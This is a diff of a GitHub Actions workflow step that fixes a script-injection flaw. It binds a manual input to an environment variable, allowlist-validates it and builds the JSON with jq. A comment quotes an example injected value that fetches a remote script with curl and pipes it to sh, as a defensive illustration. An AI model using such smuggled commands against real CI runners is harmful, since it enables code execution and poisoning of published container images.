@@ -45,24 +45,39 @@ jobs:
 
       - name: Detect changed apps
         id: detect
+        # Bind the manual input to an env var rather than interpolating
+        # ${{ github.event.inputs.app_name }} into the script. GitHub expands
+        # ${{ }} into the shell source BEFORE bash parses it, so a crafted
+        # app_name (e.g. `x"); curl evil | sh #`) would otherwise run as code on
+        # a runner that holds packages:write to ghcr.io/corpo-valley/* — a
+        # supply-chain image-poisoning vector. As a shell variable the value is
+        # never re-parsed. We additionally allowlist-validate it and build the
+        # JSON via jq, matching the hardening in release-images.yaml.
+        env:
+          APP_NAME_INPUT: ${{ github.event.inputs.app_name }}
         run: |
-          if [ -n "${{ github.event.inputs.app_name }}" ]; then
-            echo "apps=[\"${{ github.event.inputs.app_name }}\"]" >> $GITHUB_OUTPUT
-            echo "has_changes=true" >> $GITHUB_OUTPUT
+          if [ -n "$APP_NAME_INPUT" ]; then
+            if ! printf '%s' "$APP_NAME_INPUT" | grep -qE '^[a-z][a-z0-9-]{0,62}$'; then
+              echo "::error::invalid app_name '$APP_NAME_INPUT' (expected ^[a-z][a-z0-9-]{0,62}$)"
+              exit 1
+            fi
+            APPS=$(jq -nc --arg a "$APP_NAME_INPUT" '[$a]')
+            echo "apps=$APPS" >> "$GITHUB_OUTPUT"
+            echo "has_changes=true" >> "$GITHUB_OUTPUT"
           else
             CHANGED_FILES=$(git diff --name-only HEAD~1 HEAD)
             APPS=$(echo "$CHANGED_FILES" | grep -E '^(typescript|python|containers|static|frontend)/' | \
               sed -E 's#^(typescript|python|containers|static|frontend)/([^/]+).*#\2#' | \
               sort -u | jq -R -s -c 'split("\n") | map(select(length > 0))')
             if [ "$APPS" = "[]" ] || [ -z "$APPS" ]; then
-              echo "has_changes=false" >> $GITHUB_OUTPUT
-              echo "apps=[]" >> $GITHUB_OUTPUT
+              echo "has_changes=false" >> "$GITHUB_OUTPUT"
+              echo "apps=[]" >> "$GITHUB_OUTPUT"
             else
-              echo "has_changes=true" >> $GITHUB_OUTPUT
-              echo "apps=$APPS" >> $GITHUB_OUTPUT
+              echo "has_changes=true" >> "$GITHUB_OUTPUT"
+              echo "apps=$APPS" >> "$GITHUB_OUTPUT"
             fi
           fi
-          echo "Detected: $(cat $GITHUB_OUTPUT | grep apps)"
+          echo "Detected apps: $APPS"
 
   build:
     needs: detect-changes
